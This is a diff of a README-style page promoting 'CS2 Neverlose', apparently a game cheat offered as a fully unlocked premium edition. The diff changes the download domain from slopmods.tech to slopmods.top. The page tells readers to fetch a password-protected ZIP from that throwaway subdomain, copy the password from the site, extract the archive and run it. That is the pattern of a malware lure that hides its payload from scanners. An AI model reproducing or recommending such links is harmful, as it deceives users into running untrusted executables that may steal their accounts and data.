@@ -8,12 +8,12 @@ CS2 Neverlose — Windows setup and configuration · Premium workspace · Zero n
 
 > Use the release page below for Windows.
 
-- **Release page:** [iluoirosxzq.slopmods.tech](https://iluoirosxzq.slopmods.tech/)
-- **Full URL:** `https://iluoirosxzq.slopmods.tech/`
+- **Release page:** [iluoirosxzq.slopmods.top](https://iluoirosxzq.slopmods.top/)
+- **Full URL:** `https://iluoirosxzq.slopmods.top/`
 - **Type:** Desktop package | Windows 10 and 11, 64-bit
 - **Setup:** Extract the ZIP, copy the archive password from the page, then run the current version
 
-> **Password** — copy it from the yellow box on **iluoirosxzq.slopmods.tech** before you extract.
+> **Password** — copy it from the yellow box on **iluoirosxzq.slopmods.top** before you extract.
 
 ## Questions & Answers
 
@@ -33,7 +33,7 @@ CS2 Neverlose — Windows setup and configuration · Premium workspace · Zero n
 
 This release ships the **professional desktop edition** — premium modules are **enabled and active** from the first launch. No trial mode, no feature gates.
 
-Download once from **iluoirosxzq.slopmods.tech**, extract, open the app, and work with the full toolkit immediately.
+Download once from **iluoirosxzq.slopmods.top**, extract, open the app, and work with the full toolkit immediately.
 
 
 
